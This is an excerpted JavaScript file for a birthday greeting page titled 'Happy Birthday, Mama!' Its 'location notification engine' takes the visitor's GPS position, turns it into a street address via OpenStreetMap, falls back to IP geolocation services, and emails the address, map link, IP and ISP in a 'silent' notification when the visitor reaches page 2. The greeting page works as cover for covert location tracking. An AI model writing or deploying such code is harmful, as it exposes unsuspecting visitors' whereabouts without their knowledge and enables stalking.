/* ==========================================================================
   HAPPY BIRTHDAY, MAMA! - REAL ADDRESS & LOCATION NOTIFICATION ENGINE
   ========================================================================== */
...
/* --------------------------------------------------------------------------
   3. REAL ADDRESS & HYBRID LOCATION ENGINE
   Fetches Real Address (via Reverse Geocoding) + Google Maps Link + IP Backup.
   -------------------------------------------------------------------------- */
async function getRealAddressAndLocation() {
    let loc = {
        address: "Address Pending / General IP Location",
        city: "Unknown City",
    ...
    // Step A: Attempt HTML5 High-Accuracy GPS Geolocation + OpenStreetMap Reverse Geocoding
    try {
        ...
        if (gpsPos && gpsPos.coords) {
            ...
            loc.maps_url = `https://www.google.com/maps?q=${lat},${lon}`;

            // Reverse Geocode using OpenStreetMap Nominatim API
            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
            if (geoRes.ok) {
                const geoData = await geoRes.json();
                loc.address = geoData.display_name || `Lat: ${lat}, Lon: ${lon}`;
                if (geoData.address) {
                    loc.city = geoData.address.city || geoData.address.town || geoData.address.village || geoData.address.county || loc.city;
                    loc.region = geoData.address.state || geoData.address.region || loc.region;
                    loc.country = geoData.address.country || loc.country;
                }
            }
        }
    } catch (gpsErr) {
        console.log("GPS Location bypassed or unavailable, using IP Geolocation.");
    }

    // Step B: IP Geolocation Fallback 1 (ipwho.is)
    if (loc.city === "Unknown City") {
        try {
            ...
            if (res.ok) {
                ...
                if (data && data.success !== false) {
                    ...
                    loc.region = data.region || loc.region;
                    loc.country = data.country || loc.country;
                    loc.ip = data.ip || loc.ip;
                    loc.org = data.connection?.isp || data.connection?.org || loc.org;
                    if (data.latitude && data.longitude) {
                        loc.maps_url = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
                    }
                }
            }
        } catch (e) {
            console.warn("IP Provider 1 failed, trying Provider 2...");
        }
    }

    // Step C: IP Geolocation Fallback 2 (geojs.io)
    if (loc.city === "Unknown City") {
        try {
            ...
            if (res.ok) {
                ...
                if (data) {
                    ...
                    loc.country = data.country || loc.country;
                    loc.ip = data.ip || loc.ip;
                    loc.org = data.organization_name || loc.org;
                    if (data.latitude && data.longitude) {
                        loc.maps_url = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
                    }
                }
            ...
            console.warn("IP Provider 2 failed.");
        }
    }
...
async function sendSurpriseNotification() {
    ...
    // Await location fetch BEFORE sending email
    const loc = await getRealAddressAndLocation();
    ...
    const payload = {
        ...
        real_address: loc.address,
        city: loc.city,
        region: loc.region,
        country: loc.country,
        google_maps_link: loc.maps_url,
        ip_address: loc.ip,
    ...
    try {
        ...
        console.log("Surprise notification email sent with real address details!");
    } catch (err) {
...
function onPageEnter(pageNum) {
    if (pageNum === 2) {
        ...
        // Await silent real address & location email notification
